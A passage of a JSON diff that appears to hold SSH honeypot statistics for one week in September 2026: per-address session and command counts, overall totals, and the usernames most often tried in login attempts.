+  {
+   "address": "109.160.32.35",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 22:37:11.348317",
+   "last_seen": "2026-09-17 00:32:13.465151",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.43",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 23:31:19.041203",
+   "last_seen": "2026-09-16 01:24:44.374660",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.67",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-14 22:21:57.216459",
+   "last_seen": "2026-09-15 00:14:20.837972",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.85",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 19:20:19.455544",
+   "last_seen": "2026-09-15 21:27:30.042161",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.66",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1431,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11472,
+   "first_seen": "2026-09-17 17:19:06.240368",
+   "last_seen": "2026-09-17 19:54:02.761476",
+   "sessions": 1436,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.62",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1430,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11464,
+   "first_seen": "2026-09-18 16:29:40.485212",
+   "last_seen": "2026-09-18 18:58:49.530418",
+   "sessions": 1435,
+   "usernames_tried": 342
+  },
+  {
+   "address": "109.160.32.102",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1096,
+   "country": "United States",
+   "country_code": "US",
+   "events": 8782,
+   "first_seen": "2026-09-19 22:28:18.829479",
+   "last_seen": "2026-09-20 00:18:18.238826",
+   "sessions": 1099,
+   "usernames_tried": 350
+  },
+  {
+   "address": "109.160.32.109",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1096,
+   "country": "United States",
+   "country_code": "US",
+   "events": 8782,
+   "first_seen": "2026-09-21 04:48:42.350347",
+   "last_seen": "2026-09-21 06:15:20.910142",
+   "sessions": 1099,
+   "usernames_tried": 350
+  },
+  {
+   "address": "109.160.32.119",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1096,
+   "country": "United States",
+   "country_code": "US",
+   "events": 8782,
+   "first_seen": "2026-09-20 18:23:55.549487",
+   "last_seen": "2026-09-20 19:54:18.013907",
+   "sessions": 1099,
+   "usernames_tried": 350
+  },
+  {
+   "address": "109.160.32.77",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1096,
+   "country": "United States",
+   "country_code": "US",
+   "events": 8782,
+   "first_seen": "2026-09-19 11:19:35.067231",
+   "last_seen": "2026-09-19 12:42:45.390504",
+   "sessions": 1099,
+   "usernames_tried": 350
+  }
+ ],
+ "totals": {
+  "asns": 242,
+  "countries": 64,
+  "events": 282824,
+  "first_event": "2026-09-14 07:31:15.476681",
+  "last_event": "2026-09-21 06:20:17.680938",
+  "sessions": 36202,
+  "source_addresses": 656
+ },
+ "usernames": [
+  {
+   "attempts": 13158,
+   "source_addresses": 119,
+   "username": "root"
+  },
+  {
+   "attempts": 2470,
+   "source_addresses": 37,
+   "username": "ubuntu"
+  },
+  {
+   "attempts": 1225,
+   "source_addresses": 71,
+   "username": "admin"
+  },
+  {
+   "attempts": 808,
+   "source_addresses": 38,
+   "username": "user"
+  },
+  {
+   "attempts": 679,
+   "source_addresses": 29,
+   "username": "deploy"
+  },
+  {
+   "attempts": 529,
+   "source_addresses": 33,
+   "username": "test"
+  },
+  {
+   "attempts": 308,
+   "source_addresses": 30,
+   "username": "user1"
+  },
+  {
+   "attempts": 295,
+   "source_addresses": 27,
+   "username": "claude"
+  },
+  {
+   "attempts": 246,
+   "source_addresses": 29,
+   "username": "debian"
+  },
+  {
+   "attempts": 239,
+   "source_addresses": 26,
+   "username": "minecraft"
+  },
+  {
+   "attempts": 230,
+   "source_addresses": 28,
+   "username": "postgres"
+  },
+  {
+   "attempts": 205,
+   "source_addresses": 25,
+   "username": "dev"
+  },
+  {
+   "attempts": 203,
+   "source_addresses": 25,
+   "username": "ftpuser"
+  },
+  {
+   "attempts": 191,
+   "source_addresses": 28,
+   "username": "frappe"
+  },
+  {
+   "attempts": 190,
+   "source_addresses": 29,
+   "username": "guest"
+  },
+  {
+   "attempts": 183,
+   "source_addresses": 26,
+   "username": "developer"
+  },
+  {
+   "attempts": 181,
+   "source_addresses": 30,
+   "username": "oracle"
+  },
+  {
+   "attempts": 180,
+   "source_addresses": 30,
+   "username": "git"
+  },
+  {
+   "attempts": 179,
+   "source_addresses": 25,
+   "username": "openclaw"
+  },
+  {
+   "attempts": 173,
+   "source_addresses": 26,
+   "username": "admin1"
+  }
+ ]
+}
